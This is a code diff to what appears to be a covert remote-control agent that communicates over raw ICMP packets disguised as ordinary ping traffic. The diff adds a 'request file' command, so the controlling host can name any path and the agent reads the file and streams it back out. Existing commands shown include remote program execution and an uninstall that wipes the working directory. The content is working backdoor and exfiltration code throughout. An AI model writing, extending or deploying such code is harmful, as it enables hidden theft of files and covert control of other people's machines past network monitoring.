@@ -29,6 +29,7 @@ CMD_DISCONNECT = 1
 CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
 CMD_RUN_PROGRAM = 4
+CMD_REQUEST_FILE = 5
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
@@ -68,6 +69,9 @@ MAX_CHUNK_RETRIES = 5
 # Run-program limits.
 MAX_OUTPUT_BYTES = 0xFFFFFFFF                # 32-bit size header lifts the old 64KB cap
 SUBPROCESS_TIMEOUT_SECONDS = 30.0
+
+# Outbound file (option 5: hosta requests a file from hostb): same 4GB protocol cap.
+MAX_OUTBOUND_FILE_BYTES = 0xFFFFFFFF
 
 # Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
 # 0x10..0x3F filler pattern. hosta ignores this payload — it only reads
@@ -837,6 +841,76 @@ def receive_file(ctx: Context):
         send_socket.close()
 
 
+def send_file(ctx: Context):
+    """Handle CMD_REQUEST_FILE: receive the requested path, read the file,
+    stream the bytes back via the chunked protocol. An empty stream signals
+    'not found / unreadable' to hosta."""
+    if not ctx.connected_to:
+        return
+
+    source_ip = detect_source_ip(ctx.connected_to)
+
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+
+    try:
+        # Phase A: signal ready to receive the path.
+        try:
+            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
+        except OSError as exc:
+            ctx.error_message = f"failed to send ack_ready: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+        print(f"[ACK_READY] sent to {ctx.connected_to}")
+
+        # Phase B: receive the requested path.
+        path_bytes = receive_byte_stream_chunked(
+            recv_socket, send_socket, source_ip, ctx.connected_to,
+            ctx.key, METADATA_TIMEOUT_SECONDS,
+        )
+        if path_bytes is None:
+            print("[SEND] path receive failed; aborting")
+            return
+        try:
+            requested_path = path_bytes.decode("utf-8")
+        except UnicodeDecodeError:
+            requested_path = path_bytes.decode("utf-8", errors="replace")
+        print(f"[SEND] hosta requested: {requested_path!r}")
+
+        # Phase C: read the file. Empty payload signals failure to hosta.
+        try:
+            with open(requested_path, "rb") as f:
+                file_bytes = f.read()
+        except (FileNotFoundError, IsADirectoryError, PermissionError) as exc:
+            print(f"[SEND] cannot read {requested_path}: {exc}")
+            file_bytes = b""
+        except OSError as exc:
+            print(f"[SEND] cannot read {requested_path}: {exc}")
+            file_bytes = b""
+
+        if len(file_bytes) > MAX_OUTBOUND_FILE_BYTES:
+            print(f"[SEND] file too large ({len(file_bytes)} bytes); aborting")
+            file_bytes = b""
+
+        if file_bytes:
+            print(f"[SEND] sending {len(file_bytes)} bytes")
+        else:
+            print("[SEND] sending empty stream to signal failure")
+
+        if not send_byte_stream_chunked(send_socket, recv_socket, source_ip,
+                                        ctx.connected_to, ctx.key, file_bytes):
+            print("[SEND] file send failed")
+            return
+        print("[SEND] file sent")
+    finally:
+        recv_socket.close()
+        send_socket.close()
+
+
 def uninstall(ctx: Context):
     cwd = os.getcwd()
     print(f"[UNINSTALL] wiping {cwd}")
@@ -968,6 +1042,9 @@ if __name__ == "__main__":
             elif command_code == CMD_RUN_PROGRAM:
                 print("\nRunning program...")
                 run_program(ctx)
+            elif command_code == CMD_REQUEST_FILE:
+                print("\nSending requested file...")
+                send_file(ctx)
             else:
                 print(f"Ignoring unknown command code {command_code}.")
 
